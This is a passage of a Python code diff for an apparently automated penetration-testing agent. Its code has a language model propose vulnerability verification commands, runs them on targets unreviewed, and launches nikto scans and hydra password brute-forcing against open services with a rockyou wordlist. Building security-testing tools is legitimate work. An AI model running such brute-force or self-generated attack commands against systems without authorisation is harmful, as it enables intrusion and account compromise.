+            raw = await self.llm.chat(prompt, response_format="json", temperature=0.1, max_tokens=200)
+            data = json.loads(raw)
+            return data.get("confirmed", False)
+        except Exception:
+            return False
+
+    # ================================================================
+    # Phase 4: LLM 主动漏洞发现
+    # ================================================================
+
+    async def _llm_active_discovery(
+        self,
+        target: str,
+        target_os: str,
+        ports: list[PortInfo],
+        fingerprints: dict[int, dict],
+        web_paths: list[str],
+        existing_findings: list[VulnFinding],
+    ) -> list[VulnFinding]:
+        """LLM 根据指纹主动推测漏洞并生成验证命令"""
+        from backend.llm.prompts.templates import VULN_ACTIVE_DISCOVERY
+
+        fp_text = ""
+        for port, fp in fingerprints.items():
+            fp_text += (
+                f"\n端口 {port}:\n"
+                f"  URL: {fp.get('url', '')}\n"
+                f"  whatweb: {fp.get('whatweb', '')[:500]}\n"
+                f"  httpx: {fp.get('httpx', '')[:300]}\n"
+                f"  JSON探测: {fp.get('json_probe', '无')}\n"
+                f"  nmap: {fp.get('nmap_version', '')}\n"
+                f"  识别技术: {fp.get('summary', 'unknown')}\n"
+            )
+
+        existing_text = "\n".join(
+            f"- {f.name} ({f.severity}, {f.tool})" for f in existing_findings[:20]
+        ) or "无"
+
+        prompt = VULN_ACTIVE_DISCOVERY.format(
+            target=target,
+            target_os=target_os,
+            fingerprints_text=fp_text,
+            web_paths=json.dumps(web_paths[:20], ensure_ascii=False),
+            existing_findings=existing_text,
+        )
+
+        try:
+            result = await self.llm.chat(prompt, response_format="json")
+            plan = json.loads(result)
+        except Exception as e:
+            logger.warning(f"[VulnAgent] LLM 主动发现失败: {e}")
+            return []
+
+        checks = plan.get("checks", [])
+        if not checks:
+            return []
+
+        logger.info(f"[VulnAgent] LLM 建议验证 {len(checks)} 个潜在漏洞")
+        findings: list[VulnFinding] = []
+
+        for check in checks[:8]:
+            vuln_name = check.get("vuln_name", "未知漏洞")
+            command = check.get("verify_command", "")
+            success_indicator = check.get("success_indicator", "")
+            severity = check.get("severity", "medium")
+            description = check.get("description", "")
+            port = check.get("port", None)
+
+            if not command:
+                continue
+
+            logger.info(f"[VulnAgent] LLM 验证: {vuln_name} -> {command[:100]}...")
+
+            exec_result: ExecuteResult = await self.executor.run_script(
+                script_content=command,
+                timeout=30,
+            )
+
+            # 让 LLM 判断验证结果
+            analyze_prompt = (
+                f"分析以下漏洞验证命令的执行结果：\n\n"
+                f"验证目标: {vuln_name}\n"
+                f"执行命令: {command}\n"
+                f"期望标志: {success_indicator}\n\n"
+                f"stdout:\n```\n{exec_result.stdout[:2000]}\n```\n\n"
+                f"stderr:\n```\n{exec_result.stderr[:500]}\n```\n\n"
+                f"exit_code: {exec_result.exit_code}\n\n"
+                f"返回 JSON（不含代码块）：\n"
+                f'{{"confirmed": true或false, "evidence": "判断依据", "exploitable": true或false}}'
+            )
+
+            try:
+                analysis_raw = await self.llm.chat(analyze_prompt, response_format="json")
+                analysis = json.loads(analysis_raw)
+            except Exception:
+                analysis = {"confirmed": False}
+
+            if analysis.get("confirmed"):
+                logger.info(f"[VulnAgent] LLM 确认漏洞: {vuln_name}")
+                findings.append(VulnFinding(
+                    name=vuln_name,
+                    severity=severity,
+                    target=f"http://{target}:{port}" if port else target,
+                    port=port,
+                    description=description,
+                    evidence=exec_result.stdout[:5000],
+                    exploitable=analysis.get("exploitable", False),
+                    tool="llm-discovery",
+                ))
+
+        logger.info(f"[VulnAgent] LLM 主动发现: {len(findings)} 个确认漏洞")
+        return findings
+
+    # ================================================================
+    # Nikto + Hydra
+    # ================================================================
+
+    async def _nikto_scan(self, web_url: str) -> dict:
+        result: ExecuteResult = await self.executor.run(
+            tool="nikto",
+            args=["-h", web_url, "-Format", "json", "-nointeractive", "-maxtime", "60s"],
+            timeout=90,
+        )
+        findings: list[VulnFinding] = []
+        if result.success and result.stdout:
+            findings = self.nikto_parser.parse(result.stdout, web_url)
+        return {"findings": findings, "raw_nikto": result.stdout}
+
+    async def _brute_force_scan_wrapper(self, target: str, ports: list[PortInfo]) -> list[VulnFinding]:
+        r = await self._brute_force_scan(target, ports)
+        return r.get("findings", [])
+
+    async def _brute_force_scan(self, target: str, ports: list[PortInfo]) -> dict:
+        findings: list[VulnFinding] = []
+        tasks = []
+        for port_info in ports:
+            if port_info.port in BRUTE_SERVICES:
+                proto, users = BRUTE_SERVICES[port_info.port]
+                tasks.append(self._hydra_brute(target, port_info.port, proto, users))
+        if not tasks:
+            return {"findings": []}
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for r in results:
+            if isinstance(r, list):
+                findings.extend(r)
+        return {"findings": findings}
+
+    async def _hydra_brute(
+        self, target: str, port: int, protocol: str, usernames: list[str]
+    ) -> list[VulnFinding]:
+        result: ExecuteResult = await self.executor.run(
+            tool="hydra",
+            args=[
+                "-L", "/dev/stdin",
+                "-P", "/usr/share/wordlists/rockyou-top100.txt",
+                "-t", "4",
+                "-f",
+                f"{protocol}://{target}:{port}",
+            ],
+            input_data="\n".join(usernames),
+            timeout=120,
+        )
+        findings = []
+        if result.success and "login:" in result.stdout:
+            for line in result.stdout.splitlines():
+                if "[" in line and "login:" in line:
+                    findings.append(VulnFinding(
+                        name=f"弱口令 ({protocol.upper()})",
+                        severity="high",
+                        target=target,
+                        port=port,
+                        description=f"在 {protocol}://{target}:{port} 发现弱口令",
+                        evidence=line.strip(),
+                        exploitable=True,
+                        tool="hydra",
+                    ))
+        return findings
+
+
+def _deduplicate(findings: list[VulnFinding]) -> list[VulnFinding]:
+    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
+    seen: dict[str, VulnFinding] = {}
+    for f in findings:
+        key = f"{f.cve or f.name}:{f.port}"
+        if key not in seen:
+            seen[key] = f
+        else:
+            if severity_order.get(f.severity, 99) < severity_order.get(seen[key].severity, 99):
+                seen[key] = f
+    return list(seen.values())
